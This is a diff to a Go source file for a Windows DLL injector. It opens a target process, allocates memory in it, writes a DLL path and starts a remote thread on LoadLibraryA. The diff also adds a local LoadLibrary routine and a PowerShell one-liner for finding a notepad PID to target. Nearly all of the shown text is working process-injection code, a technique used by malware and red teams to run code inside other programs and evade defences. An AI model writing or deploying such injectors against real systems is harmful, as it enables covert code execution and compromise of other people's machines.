@@ -10,6 +10,10 @@ package main
 	implement pe injection (remote process)
 
 	Working remote DLL injection 12/19/21
+
+	powershell to hunt for PID:
+
+	foreach ($p in $(ps)) { if ($p.Name -eq "notepad"){$p}}
 */
 
 import (
@@ -112,7 +116,7 @@ func WriteProcessMemory(hProc uintptr, lpBaseAddress uintptr, lpBuffer uintptr, 
 }
 
 //CreateRemoteThread
-func CreateRemoteThreadEx(hProc uintptr, lpSecurityAttributes uintptr, size int, lpStartAddress uintptr, lpParameter uintptr, flags int) (handle uintptr) {
+func CreateRemoteThread(hProc uintptr, lpSecurityAttributes uintptr, size int, lpStartAddress uintptr, lpParameter uintptr, flags int) (handle uintptr) {
 	var nargs uintptr = 6
 	if ret, _, callErr := syscall.Syscall6(uintptr(createRemoteThreadEx), nargs, hProc, lpSecurityAttributes, uintptr(size), lpStartAddress, lpParameter, uintptr(flags)); callErr != 0 {
 		abort("Call CreateRemoteThreadEx", callErr)
@@ -133,8 +137,9 @@ func CloseHandle(handle uintptr, extra1 uintptr, extra2 uintptr) (success uintpt
 }
 
 // INJECTORS: core logic
+func InjectDLL(pDll string, dwProcessID int) {
 
-func InjectDLL(pDll string, dwProcessID uintptr) {
+	//todo: add more granular checks for success after each function call; figure out why createremotethread does not exit gracefully
 
 	var hProc uintptr
 	//var hRemoteThread uintptr
@@ -144,7 +149,7 @@ func InjectDLL(pDll string, dwProcessID uintptr) {
 	db := []byte(pDll)
 	//get handle to target proc
 
-	hProc = OpenProcess(CREATE_THREAD_ACCESS, 0, dwProcessID)
+	hProc = OpenProcess(CREATE_THREAD_ACCESS, 0, uintptr(dwProcessID))
 
 	//allocate space in target
 	pRemoteBuff = VirtualAllocEx(hProc, 0, len(pDll), MEM_PERMISSIONS, PAGE_READWRITE, 0)
@@ -153,11 +158,17 @@ func InjectDLL(pDll string, dwProcessID uintptr) {
 	_ = WriteProcessMemory(hProc, pRemoteBuff, uintptr(unsafe.Pointer(&db[0])), len(pDll), 0, 0)
 
 	//execute with createremotethreadex
-	_ = CreateRemoteThreadEx(hProc, 0, 0, loadLibraryA, pRemoteBuff, 0)
+	_ = CreateRemoteThread(hProc, 0, 0, loadLibraryA, pRemoteBuff, 0)
 
 	//close handle to target proc
 	_ = CloseHandle(hProc, 0, 0)
 
+}
+
+//working local DLL injection!
+func LoadDLL(pDll string) {
+
+	_, _ = syscall.LoadLibrary(pDll)
 }
 
 //main etc.
@@ -167,7 +178,9 @@ func main() {
 	dll := flag.String("dll", "test", "path to dll for injection")
 	pid := flag.Int("pid", 0, "Process ID to inject into")
 	flag.Parse()
+	fmt.Println(pid)
 
-	InjectDLL(*dll, (uintptr)(*pid))
+	LoadDLL(*dll)
+	//InjectDLL(*dll, *pid)
 
 }
